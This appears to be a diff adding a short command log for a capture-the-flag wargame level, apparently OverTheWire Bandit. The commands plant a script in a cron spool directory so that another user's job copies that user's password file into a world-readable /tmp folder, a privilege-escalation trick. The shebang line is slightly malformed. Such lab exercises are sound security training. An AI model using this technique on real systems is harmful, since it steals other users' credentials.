@@ -1,0 +1,9 @@
+cd /etc/cron.d/
+ls
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+vi script.sh
+#!bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/rand/password
+chmod 777 -R /tmp/rand
+cp script.sh /var/spool/bandit24
